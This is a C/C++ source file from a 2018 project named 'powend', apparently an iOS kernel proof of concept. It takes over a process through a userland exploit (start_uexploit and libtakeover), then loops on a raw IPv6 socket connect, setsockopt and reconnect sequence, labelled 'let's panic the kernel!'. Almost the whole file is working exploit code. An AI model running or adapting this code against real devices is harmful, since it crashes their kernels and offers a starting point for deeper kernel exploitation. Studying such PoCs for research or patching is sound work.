//
//  doit.c
//  powend
//
//  Created by simo on 12/10/2018.
//  Copyright © 2018 simo ghannam. All rights reserved.
//

// THIS IS NOT A JAILBREAK
extern "C"{
#include <stdio.h>
#include "code.h"
#include <sys/socket.h>
#include <unistd.h>
};
#include <libtakeover/libtakeover.hpp>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <net/if.h>
#include <string.h>
#include <netinet/in.h>
#include <errno.h>

#define IPPROTO_IP 0

#define IN6_ADDR_ANY { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 }
#define IN6_ADDR_LOOPBACK { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 }

void kernelpoc(tihmstar::takeover &tk, void *scratchSpace, size_t scratchSpaceSize) {
    int s = (int)tk.callfunc((void*)socket,{AF_INET6, SOCK_RAW, IPPROTO_IP});
    printf("res0: %d\n", s);
    
    struct sockaddr_in6 *rsa1 = NULL;
    struct sockaddr_in6 *rsa2 = NULL;

    struct sockaddr_in6 sa1 = {
        .sin6_len = sizeof(struct sockaddr_in6),
        .sin6_family = AF_INET6,
        .sin6_port = 65000,
        .sin6_flowinfo = 3,
        .sin6_addr = IN6_ADDR_LOOPBACK,
        .sin6_scope_id = 0,
    };
    struct sockaddr_in6 sa2 = {
        .sin6_len = sizeof(struct sockaddr_in6),
        .sin6_family = AF_INET6,
        .sin6_port = 65001,
        .sin6_flowinfo = 3,
        .sin6_addr = IN6_ADDR_ANY,
        .sin6_scope_id = 0,
    };
    

    rsa1 = (struct sockaddr_in6 *)scratchSpace;
    rsa2 = rsa1+1;
    unsigned char *buffer = (unsigned char *)(rsa2+1);
    
    tk.writeMem(rsa1, &sa1, sizeof(sa1));
    tk.writeMem(rsa2, &sa2, sizeof(sa2));

    int res = (int)tk.callfunc((void*)connect,{(uint64_t)s, (uint64_t)rsa1, sizeof(sa1)});
    printf("res1: %d\n", res);
    
    res = (int)tk.callfunc((void*)setsockopt,{(uint64_t)s, 41, 50, (uint64_t)buffer, sizeof(buffer)});
    printf("res1.5: %d\n", res);
    
    res = (int)tk.callfunc((void*)connect,{(uint64_t)s, (uint64_t)rsa2, sizeof(sa2)});
    printf("res2: %d\n", res);
    
    tk.callfunc((void*)close,{(uint64_t)s});
    printf("done\n");
}


extern "C" void start_jb(void){
    mach_port_t pport = start_uexploit();
    
    void *scratchSpace = NULL;
    size_t scratchSpaceSize = 0;

    tihmstar::takeover pwd(tihmstar::takeover::takeoverWithExceptionHandler(pport));
    printf("created takeover\n");
    
    pwd.overtakeMe();

    printf("overtook me!\n");
    
    scratchSpace = pwd.allocMem(scratchSpaceSize = 0x1000);
    
    printf("ready?\n");
    sleep(3);
    
    printf("let's panic the kernel!\n");
    while (1) {
        kernelpoc(pwd,scratchSpace,scratchSpaceSize);
        printf("failed, retry!\n");
        sleep(1);
    }
    
    printf("done?\n");
}
